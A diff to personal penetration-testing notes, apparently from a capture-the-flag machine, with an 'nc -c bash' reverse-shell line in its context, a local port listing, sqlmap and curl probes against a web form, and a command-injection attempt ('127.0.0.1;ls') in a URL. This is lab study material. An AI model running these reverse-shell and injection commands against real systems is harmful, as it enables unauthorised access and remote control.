@@ -135,10 +135,34 @@ nc -c bash 10.10.16.6 1234
 -rw-r--r--   1 root root   663 Apr 12  2016 bash_completion.sh
 ```   
 
-* Private SSH keys  
+* Private SSH keys  //didn't find anything
 ```console
 /etc/ImageMagick-6/mime.xml
 ```
+
+
+* There's an open 80 (http) port on the system when I'm connected to it as "mindy chroot".
+```console
+localhost [127.0.0.1] 80 (http) open
+localhost [127.0.0.1] 25 (smtp) open
+localhost [127.0.0.1] 22 (ssh) open
+```  
+
+* Try this  
+'name=&email=&message='
+
+sqlmap -u http://localhost/index.html --data='name=&email=&message=' --method POST --batch
+
+curl http://localhost/index.html?name=shodan&email=jon@gmail.com&message=get+out+now
+
+curl -X POST -d 'name=shodan' -d 'email=jon@gmail.com' -d 'message=get+out+now' http://localhost/index.html  
+
+/etc/init/ssh.conf  
+
+	
+curl "http://localhost/index.html?127.0.0.1;ls&#8221;"  
+
+* .... When you start a chroot environment, you are generally already root, so you don't need to use sudo or su root.
 <br/><br/>
 
 
